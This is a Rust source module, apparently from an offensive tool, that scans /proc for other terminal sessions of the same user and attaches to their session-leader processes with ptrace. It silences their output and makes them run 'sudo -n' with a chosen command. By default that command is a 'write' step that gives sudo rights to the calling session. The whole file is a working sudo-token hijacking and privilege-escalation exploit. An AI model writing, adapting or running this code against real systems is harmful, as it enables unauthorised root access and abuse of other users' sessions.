use crate::proc;
use crate::traceter;
use crate::utils;
use clap::Args;
use std::fs::{self, canonicalize};
use std::{env, str};

#[derive(Args)]
pub struct InjectArgs {
    /// Command to execute by sudo in other session. By default
    /// sudo privs will be given to this session.
    #[arg(num_args = 1..)]
    command: Vec<String>,

    /// sudo path
    #[arg(long)]
    path: Option<String>,

    /// Do not block stdin and stderr in injected commands. Intended for
    /// debugging.
    #[arg(long)]
    show: bool,
}

pub fn main_inject(args: InjectArgs) -> Result<(), String> {
    let sudo_filepath = match args.path {
        Some(filepath) => filepath,
        None => match utils::find_in_path("sudo") {
            Some(filepath) => filepath,
            None => return Err(format!(
                "Unable to find sudo binary. Use --path option to provide it."
            )),
        },
    };
    log::debug!("Sudo program: {}", sudo_filepath);

    let command = if args.command.len() > 0 {
        args.command
    } else {
        default_command()
    };
    log::debug!("Command: {:?}", &command);

    let pids = search_other_session_processes()?;
    if pids.len() == 0 {
        return Err(format!("No other sessions found"));
    }

    let silence = !args.show;
    let mut injected = false;
    for pid in pids {
        if let Err(err) =
            execute_on_process(pid, &sudo_filepath, &command, silence)
        {
            log::warn!("{}", err);
            continue;
        }
        injected = true;
    }

    if injected {
        println!(
            "Injection work. sudo may work now. If not, retry injection later."
        );
    } else {
        return Err(format!("Unable to inject. Maybe ptrace is blocked?"));
    }

    return Ok(());
}

fn default_command() -> Vec<String> {
    let filepath = get_current_absolute_filepath();

    return vec![
        filepath,
        "write".to_string(),
        "--pid".to_string(),
        format!("{}", utils::getppid()),
        "--uid".to_string(),
        format!("{}", utils::geteuid()),
        "-vvvv".to_string(),
    ];
}

fn get_current_absolute_filepath() -> String {
    let simple_args: Vec<String> = env::args().collect();
    let abs_path = canonicalize(simple_args.get(0).unwrap()).unwrap();
    let abs_path = abs_path.into_os_string().into_string().unwrap();
    return abs_path;
}

fn search_other_session_processes() -> Result<Vec<i32>, String> {
    let proc_path = "/proc";
    let my_euid = utils::geteuid();
    let my_sid = utils::getmysid();

    let mut target_pids = Vec::new();

    for path in fs::read_dir(&proc_path)
        .map_err(|e| format!("Unable to open {}: {}", proc_path, e))?
    {
        let path = match path {
            Err(_) => continue,
            Ok(p) => p,
        };

        let pid = match path.file_name().to_str().unwrap().parse::<i32>() {
            Ok(pid) => pid,
            Err(_) => continue,
        };

        let mut path_buf = path.path();
        path_buf.push("status");
        for line in fs::read_to_string(path_buf).unwrap().lines() {
            if !line.starts_with("Uid") {
                continue;
            }

            let parts: Vec<&str> = line.split("\t").collect();
            let euid = parts[2].parse::<u32>().unwrap();

            if euid != my_euid {
                continue;
            }

            let sid = match utils::getsid(pid) {
                Some(sid) => sid,
                None => continue,
            };

            if sid == my_sid {
                continue;
            }

            let tty = proc::process_tty_dev_t(pid).unwrap();

            if tty == 0 {
                continue;
            }

            if pid != sid {
                continue;
            }

            log::debug!(
                "Found session leader: tid:{} ({}) sid:{} pid:{} cmdline:{}",
                tty,
                utils::dev_t_to_name(tty).unwrap_or("".to_string()),
                sid,
                pid,
                proc::process_cmdline(pid).unwrap()
            );

            target_pids.push(pid);
        }
    }

    return Ok(target_pids);
}

fn execute_on_process(
    pid: i32,
    sudo_file: &String,
    command: &Vec<String>,
    silence: bool,
) -> Result<(), String> {
    let session =
        traceter::init_forked_trace_session(pid).map_err(|e| e.to_string())?;

    if silence {
        if let Err(e) = traceter::execute_close(&session, 1) {
            log::warn!("Error closing stdin on {}: {}", pid, e);
        }
        if let Err(e) = traceter::execute_close(&session, 2) {
            log::warn!("Error closing stderr on {}: {}", pid, e);
        }
    }

    // command to execute: sudo -n <command>
    let filename = sudo_file;
    let mut argv = vec![filename.to_string(), "-n".to_string()];
    argv.extend_from_slice(command);

    let envp = Vec::new();
    let result =
        traceter::prepare_execve_from_local(&session, filename, &argv, &envp);

    if result.is_err() {
        let _ = traceter::send_signal(&session, traceter::SIGKILL);
        result.map_err(|e| e.to_string())?;
    }

    traceter::detach_session(session);

    return Ok(());
}
